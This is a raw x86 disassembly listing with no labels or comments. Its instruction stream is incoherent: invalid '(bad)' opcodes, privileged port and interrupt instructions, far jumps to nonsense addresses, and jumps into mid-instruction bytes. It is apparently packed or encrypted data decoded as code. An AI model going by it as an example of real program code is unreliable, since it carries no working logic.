  426d80:	dec    ebp
  426d81:	xor    al,0x71
  426d84:	and    bh,0x71
  426d87:	push   ebx
  426d88:	push   ecx
  426d89:	mov    dl,0xbe
  426d8b:	or     al,0xed
  426d8d:	dec    ebx
  426d8e:	or     eax,0xff29bcb2
  426d93:	sub    ch,ah
  426d95:	std    
  426d96:	mov    ecx,0xaf04180
  426d9b:	dec    ebp
  426d9c:	dec    ebp
  426d9d:	dec    ebp
  426d9e:	mov    ecx,0xb2b9b64b
  426da3:	mov    edx,0x7b6b909
  426da8:	mov    ecx,0xf080b6ff
  426dad:	jno    0x426d2f
  426daf:	out    0x71,eax
  426db1:	push   ebx
  426db2:	push   ecx
  426db3:	mov    dl,0xbe
  426db5:	or     al,0xed
  426db7:	dec    ebx
  426db8:	or     eax,0xff29bcb2
  426dbd:	sub    ch,ah
  426dbf:	std    
  426dc0:	mov    ecx,0xaf01650
  426dc5:	dec    ebp
  426dc6:	dec    ebp
  426dc7:	dec    ebp
  426dc8:	xor    al,0x71
  426dcb:	adc    BYTE PTR [edi-0x12aeac8f],0xc2
  426dd2:	or     eax,0xb20cbeb2
  426dd7:	clc    
  426dd8:	sub    edi,edi
  426dda:	inc    BYTE PTR [eax-0x4d138e69]
  426de0:	xor    al,0x71
  426de3:	in     eax,dx
  426de4:	add    eax,0xb27e530d
  426de9:	mov    edx,0xc07b229
  426dee:	push   DWORD PTR [esi-0x4128fad]
  426df4:	sbb    edx,DWORD PTR [ebx]
  426df6:	jo     0x426e4b
  426df8:	dec    ebp
  426df9:	arpl   bx,cx
  426dfb:	or     edx,ebp
  426dfd:	call   0x934c:0x94d4d4d
  426e04:	dec    ebp
  426e05:	dec    ebp
  426e06:	dec    ebp
  426e07:	ins    BYTE PTR es:[edi],dx
  426e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e09:	mov    DWORD PTR [esp+edx*8],0x50767701
  426e10:	ja     0x426e01
  426e12:	xor    BYTE PTR [edi-0x11],0x64
  426e16:	mov    ecx,0x5011df58
  426e1b:	sbb    eax,0x86ee6d7c
  426e20:	pop    DWORD PTR [ebx+0x26]
  426e23:	xor    BYTE PTR [edi+0x76],0x80
  426e27:	lock std 
  426e29:	or     DWORD PTR [esi-0x3],eax
  426e2c:	or     al,0xb2
  426e2e:	mov    esi,0x76f0800c
  426e33:	adc    BYTE PTR [edi+0x537c53fd],0x72
  426e3a:	push   edi
  426e3c:	xor    BYTE PTR [edi-0x38],0xaa
  426e40:	das    
  426e41:	cmp    cl,BYTE PTR es:[ebp+0x4f010a8d]
  426e48:	enter  0x4d0d,0x4d
  426e4c:	or     dh,BYTE PTR [edx+0x778629ba]
  426e52:	mov    edx,0x77804d4d
  426e57:	xchg   DWORD PTR [eax+0x460932f0],eax
  426e5d:	std    
  426e5e:	or     al,0xb2
  426e60:	mov    esi,0x87f0800c
  426e65:	adc    BYTE PTR [edi+0x29bab232],0x80
  426e6c:	add    eax,ecx
  426e6e:	or     eax,0x30804d4d
  426e73:	push   ebx
  426e74:	jl     0x426ec9
  426e76:	jb     0x426e77
  426e78:	sti    
  426e79:	arpl   bp,di
  426e7b:	or     DWORD PTR [edi+0x56],ecx
  426e7e:	lea    ecx,[ebp-0x37287f73]
  426e84:	jl     0x426efd
  426e86:	scas   eax,DWORD PTR es:[edi]
  426e87:	fst    DWORD PTR [edi-0x21]
  426e8a:	adc    DWORD PTR [esi-0x7a],ebx
  426e8d:	pop    DWORD PTR [ebx+0x26]
  426e90:	push   eax
  426e91:	ja     0x426e8a
  426e93:	push   eax
  426e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e95:	jp     0x426ee7
  426e97:	ja     0x426e1b
  426e99:	xor    BYTE PTR [edi+0x7a],0x80
  426e9d:	lock or BYTE PTR [ecx],0x46
  426ea1:	std    
  426ea2:	or     al,0xb2
  426ea4:	mov    esi,0x7af0800c
  426ea9:	adc    BYTE PTR [edi+0x537c5382],0x72
  426eb0:	push   edi
  426eb2:	stos   BYTE PTR es:[edi],al
  426eb3:	dec    ebp
  426eb4:	xlat   BYTE PTR ds:[ebx]
  426eb5:	xor    eax,0x4d29bab2
  426eba:	loopne 0x426ef2
  426ebc:	cmp    cl,BYTE PTR [ebp-0x7b817973]
  426ec2:	dec    ebp
  426ec3:	dec    ebp
  426ec4:	xor    BYTE PTR [edi+0x7a],0x80
  426ec8:	lock or BYTE PTR [ecx],0x46
  426ecc:	std    
  426ecd:	or     al,0xb2
  426ecf:	mov    esi,0x7af0800c
  426ed4:	adc    BYTE PTR [edi+0x537c5382],0x72
  426edb:	push   edi
  426edd:	stos   BYTE PTR es:[edi],al
  426ede:	dec    ebp
  426edf:	loopne 0x426f17
  426ee1:	cmp    cl,BYTE PTR [ebp+0x29bab28d]
  426ee7:	dec    ebp
  426ee8:	loopne 0x426f18
  426eea:	cmp    cl,BYTE PTR [ebp-0x7bc17973]
  426ef0:	dec    ebp
  426ef1:	dec    ebp
  426ef2:	or     BYTE PTR [esi+esi*1+0x3a],0x8d
  426ef7:	lea    eax,[eax+0x657f80ef]
  426efd:	in     al,dx
  426efe:	out    dx,eax
  426eff:	push   eax
  426f00:	lock out dx,eax
  426f02:	xor    al,0xaf
  426f05:	xor    BYTE PTR [edi-0x9],0x9
  426f09:	inc    esi
  426f0a:	mov    dl,0xc
  426f0c:	mov    dl,0x86
  426f0e:	or     al,0x80
  426f10:	ja     0x426ec1
  426f12:	adc    BYTE PTR [edi-0x4dd5ac09],0x84
  426f19:	sub    DWORD PTR [ebx+0x6a],edx
  426f1c:	push   DWORD PTR [edx+0x9eff080]
  426f22:	pop    esp
  426f23:	jg     0x426f3e
  426f25:	dec    edi
  426f26:	std    
  426f27:	aad    0x21
  426f29:	or     BYTE PTR [edx+eax*4+0x3a],0x8d
  426f2e:	lea    edi,[ebp+ecx*4-0xb]
  426f32:	and    al,0x6f
  426f34:	cmp    BYTE PTR [eax+0x77802177],al
  426f3a:	jno    0x426f89
  426f3c:	xlat   BYTE PTR ds:[ebx]
  426f3d:	cmp    eax,0x4dc8d74d
  426f42:	xlat   BYTE PTR ds:[ebx]
  426f43:	sub    eax,0x4d25d74d
  426f48:	xlat   BYTE PTR ds:[ebx]
  426f49:	sbb    eax,0x8615d74d
  426f4e:	cmp    cl,al
  426f50:	dec    ebp
  426f51:	dec    ebp
  426f52:	push   eax
  426f53:	dec    edi
  426f54:	xor    cl,BYTE PTR ds:0x77804d4d
  426f5a:	cmp    eax,0x8d15dded
  426f5f:	aad    0x1b
  426f61:	xor    BYTE PTR [edi+0x3d],0xed
  426f65:	frstor ds:0x80a1d58d
  426f6b:	dec    edi
  426f6c:	xor    cl,BYTE PTR ds:0xf0804d4d
  426f72:	cmp    eax,0xc41d9250
  426f77:	dec    DWORD PTR [ebp-0x29]
  426f7a:	cmp    eax,0x86c8d74d
  426f7f:	mov    WORD PTR [edx+0x4d],gs
  426f82:	dec    ebp
  426f83:	stos   DWORD PTR es:[edi],eax
  426f84:	test   eax,0x35fb70a3
  426f89:	lea    edx,[edi-0x78127880]
  426f8f:	and    DWORD PTR [ecx-0x9748884],ebx
  426f95:	and    al,0x6f
  426f97:	cmp    BYTE PTR [edi+esi*2-0x38],bh
  426f9b:	cmc    
  426f9c:	and    al,0x6f
  426f9e:	cmp    BYTE PTR [eax-0x287f7489],al
  426fa4:	mov    esp,edx
  426fa6:	or     eax,0x6f242260
  426fab:	cmp    BYTE PTR [ebx-0x4e],dl
  426fae:	scas   al,BYTE PTR es:[edi]
  426faf:	push   ebx
  426fb0:	ret    0x86b2
  426fb3:	or     al,0xb2
  426fb5:	add    ch,BYTE PTR [ecx]
  426fb7:	(bad)  
  426fb8:	cld    
  426fb9:	adc    bh,0xef
  426fbc:	arpl   WORD PTR [edx],si
  426fbe:	xor    BYTE PTR [edi-0x75],0x9
  426fc2:	sete   BYTE PTR [ebp-0x287f7273]
  426fc9:	mov    edx,DWORD PTR [ebx-0x4e]
  426fcc:	push   ebx
  426fcd:	ret    0x2b2
  426fd0:	sub    DWORD PTR [edx-0x300f37a],esi
  426fd6:	adc    bh,0x21
  426fd9:	arpl   WORD PTR [edx],si
  426fdb:	or     DWORD PTR [edi],ecx
  426fdd:	loopne 0x426f6c
  426fdf:	lea    ecx,[ebp-0x7f8e8880]
  426fe5:	xchg   edi,eax
  426fe6:	and    DWORD PTR [eax+0x539befd7],eax
  426fec:	dec    ebp
  426fed:	push   eax
  426fee:	ja     0x426f7b
  426ff0:	dec    edi
  426ff1:	jb     0x426ffc
  426ff3:	cmovb  ecx,DWORD PTR [ebp-0x706c7273]
  426ffa:	out    dx,al
  426ffb:	pop    ebx
  426ffc:	adc    BYTE PTR [edi+0x9],dh
  426fff:	cld    
  427000:	ja     0x42704f
  427002:	aad    0xfc
  427004:	ja     0x427019
  427006:	sbb    esp,edi
  427008:	ja     0x427009
  42700a:	ror    BYTE PTR [ecx],1
  42700c:	loopne 0x427085
  42700e:	dec    DWORD PTR [ecx]
  427010:	loopne 0x426fb9
  427012:	adc    ecx,edi
  427014:	jp     0x426fa3
  427016:	lea    ecx,[ebp-0x1ff68bcd]
  42701c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42701d:	dec    ebp
  42701e:	xor    esi,DWORD PTR [eax+edx*1+0x77]
  427022:	mov    bh,ah
  427024:	ja     0x426ff2
  427026:	or     eax,0xd40d77fc
  42702b:	cld    
  42702c:	ja     0x42707b
  42702e:	jl     0x42702c
  427030:	ja     0x427045
  427032:	sar    esp,cl
  427034:	ja     0x427035
  427036:	push   esp
  427037:	(bad)  
  427038:	ja     0x427039
  42703a:	(bad)  
  42703b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703c:	adc    esp,DWORD PTR [esi+0x4da78f74]
  427042:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427046:	or     eax,0xa78fc40b
  42704b:	int3   
  42704c:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427050:	mov    dl,dh
  427052:	sbb    bl,0x35
  427055:	in     eax,dx
  427056:	out    0x8b,eax
  427058:	lea    ecx,[ecx]
  42705a:	loopne 0x4270d3
  42705c:	or     edi,edx
  42705e:	or     DWORD PTR [edi-0x33],edx
  427061:	lea    ecx,[ebp-0x72e1d073]
  427067:	lea    ecx,[ebp-0x3bf688f0]
  42706d:	inc    DWORD PTR [edi+0x8]
  427070:	lea    ecx,[ebp+0x977108d]
  427076:	div    eax
  427078:	or     DWORD PTR [edi-0x11eff689],ecx
  42707e:	pop    ebx
  42707f:	jnp    0x4270e4
  427081:	test   DWORD PTR [ecx],ecx
  427083:	jmp    0x80a3:0x4d4d4d9e
  42708a:	ja     0x427054
  42708c:	push   ebx
  42708d:	mov    dl,0x80
  42708f:	lock enter 0x5ed,0xd
  427094:	stos   DWORD PTR es:[edi],eax
  427095:	les    esp,FWORD PTR [esi+0x538b7780]
  42709b:	mov    dl,0x80
  42709d:	lock mov edx,DWORD PTR [ebx-0x2]
  4270a1:	mov    dl,0xba
  4270a3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4270a9:	test   eax,0x8d21fb70
  4270ae:	xchg   edi,eax
  4270af:	add    BYTE PTR [edi+0x7cc587ed],0x77
  4270b6:	mov    dh,dh
  4270b8:	and    al,0x6f
  4270ba:	cmp    cl,dh
  4270bc:	cmc    
  4270bd:	and    al,0x6f
  4270bf:	cmp    BYTE PTR [eax-0x69],dl
  4270c2:	mov    eax,DWORD PTR [eax+0x77501577]
  4270c8:	adc    eax,0x80157780
  4270cd:	int    0x2e
  4270cf:	cmp    cl,BYTE PTR [ebp+0x15f0808d]
  4270d5:	or     BYTE PTR [ebp+0x3a2e5080],0x8d
  4270dc:	lea    eax,[eax+0x657dec30]
  4270e2:	xchg   ebx,eax
  4270e3:	push   eax
  4270e4:	lock stc 
  4270e6:	xor    BYTE PTR [edi-0x76],0x80
  4270ea:	lock mov bl,BYTE PTR [ecx+0x10de29b]
  4270f1:	out    0x2f,al
  4270f3:	push   ebx
  4270f4:	jl     0x4270a8
  4270f6:	xchg   BYTE PTR [ebx+eiz*4],cl
  4270f9:	push   ebx
  4270fa:	adc    DWORD PTR [edx-0x4d00d646],esi
  427100:	push   eax
  427101:	ja     0x427085
  427103:	xor    BYTE PTR [edi-0x76],0x80
  427107:	lock mov dl,BYTE PTR [ebx+0x7c]
  42710b:	mov    dl,0x86
  42710d:	or     al,0x53
  42710f:	adc    DWORD PTR [edx-0x4d00d646],esi
  427115:	push   eax
  427116:	ja     0x42709c
  427118:	xor    BYTE PTR [edi-0x7],0x80
  42711c:	ins    DWORD PTR es:[edi],dx
  42711d:	or     ch,ch
  42711f:	xchg   BYTE PTR [ecx],ah
  427121:	push   eax
  427122:	ja     0x42711b
  427124:	xor    BYTE PTR [edi-0x7],0x80
  427128:	ins    DWORD PTR es:[edi],dx
  427129:	pop    ebp
  42712a:	xor    al,0xf9
  42712d:	jge    0x42717e
  42712f:	xchg   edx,eax
  427130:	xchg   ebp,eax
  427131:	xor    BYTE PTR [edi-0x7],0xd5
  427135:	sbb    eax,0x805d6d80
  42713a:	lock stc 
  42713c:	cmp    BYTE PTR [edi-0x6b],0x7d
  427140:	dec    ebx
  427141:	div    DWORD PTR [ebx]
  427143:	std    
  427144:	xor    BYTE PTR [edi-0x7],0x80
  427148:	ins    DWORD PTR es:[edi],dx
  427149:	pop    ebp
  42714a:	in     al,dx
  42714b:	mov    dl,0xc4
  42714d:	in     al,dx
  42714e:	sub    BYTE PTR [ebp-0x6b],0x50
  427152:	ja     0x4270da
  427154:	xor    BYTE PTR [edi-0x76],0x80
  427158:	lock mov dl,BYTE PTR [ebx+0x7c]
  42715c:	push   ebx
  42715d:	adc    DWORD PTR [edx-0x454df37a],esi
  427163:	sub    edi,edi
  427165:	mov    dl,0x50
  427167:	ja     0x42717e
  427169:	xor    BYTE PTR [edi-0x76],0x80
  42716d:	lock mov dl,BYTE PTR [ebx+0x7c]
  427171:	push   ebx
  427172:	adc    DWORD PTR [edx-0x794dd646],esi
  427178:	or     al,0xff
  42717a:	mov    dl,0x50
  42717c:	ja     0x427193
  42717e:	xor    BYTE PTR [edi-0x76],0x80
  427182:	lock mov dl,BYTE PTR [ebx+0x11]
  427186:	push   ebx
  427187:	jl     0x42713b
  427189:	mov    edx,0xc86b229
  42718e:	push   DWORD PTR [edx+0x5071f080]
  427194:	cmp    dl,BYTE PTR [eax-0x69]
  427197:	adc    eax,0xf415777c
  42719c:	and    al,0x6f
  42719e:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271a2:	repz and al,0x6f
  4271a5:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271a9:	cli    
  4271aa:	and    al,0x6f
  4271ac:	cmp    BYTE PTR [esi-0x727290c9],bh
  4271b2:	xor    BYTE PTR [edi-0x76],0x80
  4271b6:	lock mov dl,BYTE PTR [ebx+0x7c]
  4271ba:	push   ebx
  4271bb:	adc    DWORD PTR [edx-0x454df37a],esi
  4271c1:	sub    edi,edi
  4271c3:	mov    dl,0x50
  4271c5:	ja     0x42714b
  4271c7:	xor    BYTE PTR [edi-0x7a],0xec
  4271cb:	ja     0x4271ee
  4271cd:	push   eax
  4271ce:	ja     0x427152
  4271d0:	dec    ebp
  4271d1:	xlat   BYTE PTR ds:[ebx]
  4271d2:	or     BYTE PTR [ebp-0x29],0x21
  4271d6:	xor    al,0xf9
  4271d9:	xchg   BYTE PTR [ecx+0x504d4da8],cl
  4271df:	ja     0x4271f6
  4271e1:	xor    BYTE PTR [edi+0x15],0x4f
  4271e5:	push   0xffffffd5
  4271e7:	(bad)  
  4271e8:	xor    BYTE PTR [edi-0x7e],0x50
  4271ec:	ja     0x427171
  4271ee:	xor    BYTE PTR [edi-0x7d],0x80
  4271f2:	lock and DWORD PTR [ebx-0x4e],eax
  4271f6:	push   eax
  4271f7:	ja     0x42717c
  4271f9:	xor    BYTE PTR [edi+0x15],0x80
  4271fd:	lock adc eax,0xec716d80
  427203:	xchg   edx,eax
  427204:	and    DWORD PTR [eax-0x29c7c10],eax
  42720a:	in     al,0x19
  42720c:	xor    BYTE PTR [edi+0x15],0x80
  427210:	ins    DWORD PTR es:[edi],dx
  427211:	and    DWORD PTR [eax-0x6d13ea10],eax
  427217:	out    dx,eax
  427218:	xor    al,0x83
  42721b:	inc    ebx
  42721c:	mov    dl,0xbe
  42721e:	and    ch,BYTE PTR [edi]
  427220:	lea    ecx,[ebp+0x6f24f6fa]
  427226:	cmp    BYTE PTR [eax-0x29],dl
  427229:	scas   eax,DWORD PTR es:[edi]
  42722a:	jl     0x4272a3
  42722c:	std    
  42722d:	cmc    
  42722e:	and    al,0x6f
  427230:	cmp    BYTE PTR [edi+esi*2+0x76],bh
  427234:	hlt    
  427235:	and    al,0x6f
  427237:	cmp    BYTE PTR [edi+esi*2+0x6a],bh
  42723b:	repz and al,0x6f
  42723e:	cmp    BYTE PTR [ecx],al
  427240:	ja     0x4271f1
  427242:	push   eax
  427243:	ja     0x42720d
  427245:	add    DWORD PTR [edi-0x3],esi
  427248:	push   eax
  427249:	ja     0x42727d
  42724b:	add    DWORD PTR [edi+0x76],esi
  42724e:	push   eax
  42724f:	ja     0x427266
  427251:	add    DWORD PTR [edi+0x6a],esi
  427254:	push   eax
  427255:	ja     0x4271de
  427257:	xor    BYTE PTR [edi-0x76],0x80
  42725b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42725f:	push   ebx
  427260:	adc    DWORD PTR [edx-0x454df37a],esi
  427266:	sub    edi,edi
  427268:	mov    dl,0x50
  42726a:	ja     0x4271ef
  42726c:	mov    esi,0x8d8decfe
  427271:	mov    ds:0x6f24f30d,al
  427276:	cmp    BYTE PTR [ecx],cl
  427278:	shld   esp,ebp,0x8d
  42727c:	(bad)  
  42727d:	loop   0x4272a0
  42727f:	dec    ebp
  427280:	xlat   BYTE PTR ds:[ebx]
  427281:	add    BYTE PTR [ecx],0x77
  427284:	bound  ecx,QWORD PTR [edx]
  427286:	xchg   BYTE PTR [ecx],cl
  427288:	test   al,0x4d
  42728a:	dec    ebp
  42728b:	xor    BYTE PTR [edi-0x75],0x80
  42728f:	lock mov edx,DWORD PTR [ebx+0x7c]
  427293:	push   ebx
  427294:	adc    DWORD PTR [edx-0x794dd646],esi
  42729a:	or     al,0xff
  42729c:	mov    dl,0x50
  42729e:	ja     0x427224
  4272a0:	push   eax
  4272a1:	xlat   BYTE PTR ds:[ebx]
  4272a2:	jp     0x427312
  4272a4:	out    0x7a,eax
  4272a6:	xor    BYTE PTR [edi+0x7a],0xb2
  4272aa:	xchg   BYTE PTR [ebx+edx*2],cl
  4272ad:	(bad)  
  4272ae:	mov    dl,0x2
  4272b0:	sub    edi,edi
  4272b2:	xor    dl,BYTE PTR [eax-0x29]
  4272b5:	add    DWORD PTR [eax-0xf7f7489],0xffffff8b
  4272bc:	push   ebx
  4272bd:	adc    DWORD PTR [edx+0x7c5329ba],esi
  4272c3:	mov    dl,0x86
  4272c5:	or     al,0xff
  4272c7:	mov    dl,0x80
  4272c9:	lock mov eax,DWORD PTR [eax+0x2a538b97]
  4272d0:	push   ebx
  4272d1:	xchg   esp,eax
  4272d2:	mov    dl,0xbe
  4272d4:	or     al,0xb2
  4272d6:	clc    
  4272d7:	sub    edi,edi
  4272d9:	(bad)  
  4272da:	in     al,dx
  4272db:	mov    dl,0x80
  4272dd:	lock adc DWORD PTR [eax-0x29],0x66
  4272e2:	arpl   bp,di
  4272e4:	xlat   BYTE PTR ds:[ebx]
  4272e5:	sub    DWORD PTR [eax-0xf7f7489],eax
  4272eb:	mov    edx,DWORD PTR [ebx+0x7c]
  4272ee:	push   ebx
  4272ef:	adc    DWORD PTR [edx-0x454df37a],esi
  4272f5:	sub    edi,edi
  4272f7:	mov    dl,0xa
  4272f9:	loop   0x42731c
  4272fb:	add    DWORD PTR [edi+0x62],esi
  4272fe:	or     al,BYTE PTR [esi+0x4d4d8a4c]
  427304:	xor    BYTE PTR [edi-0x76],0x80
  427308:	lock mov dl,BYTE PTR [ebx+0x7c]
  42730c:	push   ebx
  42730d:	adc    DWORD PTR [edx-0x794dd646],esi
  427313:	or     al,0xff
  427315:	mov    dl,0x80
  427317:	lock and DWORD PTR [ebx-0x3],0xffffffd5
  42731c:	sub    DWORD PTR [eax-0xf7f7589],eax
  427322:	mov    dl,BYTE PTR [ebx+0x7c]
  427325:	push   ebx
  427326:	adc    DWORD PTR [edx-0x454df37a],esi
  42732c:	sub    edi,edi
  42732e:	mov    dl,0xa
  427330:	loop   0x427353
  427332:	add    DWORD PTR [edi+0x62],esi
  427335:	or     al,BYTE PTR [esi+0x4d4d8ac9]
  42733b:	xor    BYTE PTR [edi-0x38],0x80
  42733f:	lock enter 0x3080,0x80
  427344:	lea    edx,[ebx+0x11]
  427347:	push   ebx
  427348:	jl     0x4272fc
  42734a:	mov    edx,0xc86b229
  42734f:	push   DWORD PTR [edx+0x622f758f]
  427355:	xor    al,0x8a
  427358:	adc    BYTE PTR [edi+0x532a538a],0x94
  42735f:	mov    dl,0xbe
  427361:	or     al,0xb2
  427363:	clc    
  427364:	sub    DWORD PTR [ecx],ecx
  427366:	loopne 0x4273d2
  427368:	(bad)  
  427369:	(bad)  
  42736a:	arpl   WORD PTR [edx+0xca20f09],si
  427370:	lea    ecx,[ebp-0x7fcd8880]
  427376:	lock xor al,BYTE PTR [eax+0x538d8030]
  42737d:	adc    DWORD PTR [ebx+0x7c],edx
  427380:	mov    dl,0xba
  427382:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427388:	(bad)  
  427389:	jne    0x4273ba
  42738b:	bound  eax,QWORD PTR [eax-0x687f7510]
  427391:	mov    dl,BYTE PTR [ebx+0x2a]
  427394:	push   ebx
  427395:	xchg   esp,eax
  427396:	mov    dl,0xbe
  427398:	or     al,0xb2
  42739a:	clc    
  42739b:	sub    DWORD PTR [ecx],ecx
  42739d:	loopne 0x427409
  42739f:	(bad)  
  4273a0:	(bad)  
  4273a1:	arpl   WORD PTR [edx+0xcda0f09],si
  4273a7:	lea    ecx,[ebp-0x7fea8880]
  4273ad:	lock adc eax,0x8d803080
  4273b3:	push   ebx
  4273b4:	adc    DWORD PTR [ebx+0x7c],edx
  4273b7:	mov    dl,0xba
  4273b9:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273bf:	(bad)  
  4273c0:	jne    0x4273f1
  4273c2:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273c8:	mov    dl,BYTE PTR [ebx+0x2a]
  4273cb:	push   ebx
  4273cc:	xchg   esp,eax
  4273cd:	mov    dl,0xbe
  4273cf:	or     al,0xb2
  4273d1:	clc    
  4273d2:	sub    DWORD PTR [ecx],ecx
  4273d4:	loopne 0x427440
  4273d6:	(bad)  
  4273d7:	(bad)  
  4273d8:	arpl   WORD PTR [edx+0xc130f09],si
  4273de:	lea    ecx,[ebp-0x7f788880]
  4273e4:	lock xchg DWORD PTR [eax+0x538d8030],eax
  4273eb:	adc    DWORD PTR [ebx+0x7c],edx
  4273ee:	mov    dl,0xba
  4273f0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273f6:	(bad)  
  4273f7:	jne    0x427428
  4273f9:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273ff:	mov    dl,BYTE PTR [ebx+0x2a]
  427402:	push   ebx
  427403:	xchg   esp,eax
  427404:	mov    dl,0xbe
  427406:	or     al,0xb2
  427408:	clc    
  427409:	sub    DWORD PTR [ecx],ecx
  42740b:	loopne 0x427477
  42740d:	(bad)  
  42740e:	(bad)  
  42740f:	arpl   WORD PTR [edx+0x3a830f09],si
  427415:	lea    ecx,[ebp-0x7fcd8880]
  42741b:	lock xor al,BYTE PTR [eax+0x538d8030]
  427422:	adc    DWORD PTR [edx+0x7c5329ba],esi
  427428:	mov    dl,0x86
  42742a:	or     al,0xff
  42742c:	mov    dl,0x8f
  42742e:	jne    0x42745f
  427430:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427436:	adc    BYTE PTR [edi+0x539080c8],0x2a
  42743d:	mov    dl,0xbe
  42743f:	or     al,0x53
  427441:	xchg   esp,eax
  427442:	mov    dl,0xf8
  427444:	sub    edi,edi
  427446:	dec    BYTE PTR [edi-0x2b9d30cf]
  42744c:	mov    dl,0x80
  42744e:	lock adc eax,0x97803080
  427454:	adc    eax,0x2a539080
  427459:	mov    dl,0xbe
  42745b:	or     al,0x53
  42745d:	xchg   esp,eax
  42745e:	mov    dl,0xf8
  427460:	sub    edi,edi
  427462:	dec    BYTE PTR [edi-0x599d30cf]
  427468:	mov    dl,0x80
  42746a:	lock enter 0x3080,0x80
  42746f:	xchg   edi,eax
  427470:	enter  0x9080,0x53
  427474:	sub    dl,BYTE PTR [ebx-0x6c]
  427477:	mov    dl,0xbe
  427479:	or     al,0xb2
  42747b:	clc    
  42747c:	sub    edi,edi
  42747e:	dec    BYTE PTR [edi-0x29a930cf]
  427484:	std    
  427485:	or     DWORD PTR [edi-0x43],ecx
  427488:	cmp    cl,BYTE PTR [ebp+0x1577808d]
  42748e:	xor    al,0x15
  427491:	xor    BYTE PTR [eax],0x80
  427494:	lea    edx,[ebx+0x11]
  427497:	mov    dl,0xba
  427499:	sub    DWORD PTR [ebx+0x7c],edx
  42749c:	mov    dl,0x86
  42749e:	or     al,0xff
  4274a0:	mov    dl,0x8f
  4274a2:	jne    0x4274d3
  4274a4:	bound  eax,QWORD PTR [eax+0x308032f0]
  4274aa:	adc    BYTE PTR [edi+0x53908032],0x2a
  4274b1:	mov    dl,0xbe
  4274b3:	or     al,0x53
  4274b5:	xchg   esp,eax
  4274b6:	mov    dl,0xf8
  4274b8:	sub    edi,edi
  4274ba:	dec    BYTE PTR [edi-0x2b9d30cf]
  4274c0:	mov    dl,0x80
  4274c2:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4274c9:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4274d0:	push   ebx
  4274d1:	xchg   esp,eax
  4274d2:	mov    dl,0xf8
  4274d4:	sub    edi,edi
  4274d6:	dec    BYTE PTR [edi-0x599d30cf]
  4274dc:	mov    dl,0x80
  4274de:	lock xor al,BYTE PTR [eax+0x32978030]
  4274e5:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4274ec:	mov    esi,0x29f8b20c
  4274f1:	(bad)  
  4274f2:	dec    BYTE PTR [edi-0x29a930cf]
  4274f8:	std    
  4274f9:	or     DWORD PTR [edi-0x38],ecx
  4274fc:	lea    ecx,[ebp-0x78887f73]
  427502:	xor    al,0x87
  427505:	xor    BYTE PTR [eax],0x80
  427508:	lea    edx,[ebx+0x11]
  42750b:	mov    dl,0xba
  42750d:	sub    DWORD PTR [ebx+0x7c],edx
  427510:	mov    dl,0x86
  427512:	or     al,0xff
  427514:	mov    dl,0x8f
  427516:	jne    0x427547
  427518:	bound  eax,QWORD PTR [eax+0x308015f0]
  42751e:	adc    BYTE PTR [edi+0x53908015],0x2a
  427525:	mov    dl,0xbe
  427527:	or     al,0x53
  427529:	xchg   esp,eax
  42752a:	mov    dl,0xf8
  42752c:	sub    edi,edi
  42752e:	dec    BYTE PTR [edi-0x2b9d30cf]
  427534:	mov    dl,0x80
  427536:	lock enter 0x3080,0x80
  42753b:	xchg   edi,eax
  42753c:	enter  0x9080,0x53
  427540:	sub    dh,BYTE PTR [edx-0x6bacf342]
  427546:	mov    dl,0xf8
  427548:	sub    edi,edi
  42754a:	dec    BYTE PTR [edi-0x599d30cf]
  427550:	mov    dl,0x80
  427552:	lock adc eax,0x97803080
  427558:	adc    eax,0x2a539080
  42755d:	push   ebx
  42755e:	xchg   esp,eax
  42755f:	mov    dl,0xbe
  427561:	or     al,0xb2
  427563:	clc    
  427564:	sub    edi,edi
  427566:	dec    BYTE PTR [edi-0x29a930cf]
  42756c:	std    
  42756d:	or     DWORD PTR [edi-0x33],ecx
  427570:	lea    ecx,[ebp-0x78887f73]
  427576:	xor    al,0x87
  427579:	xor    BYTE PTR [eax],0x80
  42757c:	lea    edx,[ebx+0x11]
  42757f:	mov    dl,0xba
  427581:	sub    DWORD PTR [ebx+0x7c],edx
  427584:	mov    dl,0x86
  427586:	or     al,0xff
  427588:	mov    dl,0x8f
  42758a:	jne    0x4275bb
  42758c:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427592:	adc    BYTE PTR [edi+0x539080c8],0x2a
  427599:	mov    dl,0xbe
  42759b:	or     al,0x53
  42759d:	xchg   esp,eax
  42759e:	mov    dl,0xf8
  4275a0:	sub    edi,edi
  4275a2:	dec    BYTE PTR [edi-0x2b9d30cf]
  4275a8:	mov    dl,0x80
  4275aa:	lock xor al,BYTE PTR [eax+0x32978030]
  4275b1:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4275b8:	push   ebx
  4275b9:	xchg   esp,eax
  4275ba:	mov    dl,0xf8
  4275bc:	sub    edi,edi
  4275be:	dec    BYTE PTR [edi-0x599d30cf]
  4275c4:	mov    dl,0x80
  4275c6:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4275cd:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4275d4:	mov    esi,0x29f8b20c
  4275d9:	(bad)  
  4275da:	dec    BYTE PTR [edi-0x29a930cf]
  4275e0:	std    
  4275e1:	xlat   BYTE PTR ds:[ebx]
  4275e2:	jno    0x4275e5
  4275e4:	ja     0x427648
  4275e6:	or     al,BYTE PTR [esi+0x4d4dac84]
  4275ec:	xor    al,0x5e
  4275ef:	arpl   WORD PTR [edx+0x778017d5],si
  4275f5:	mov    al,BYTE PTR [eax+0x11538af0]
  4275fb:	push   ebx
  4275fc:	jl     0x4275b0
  4275fe:	mov    edx,0xc86b229
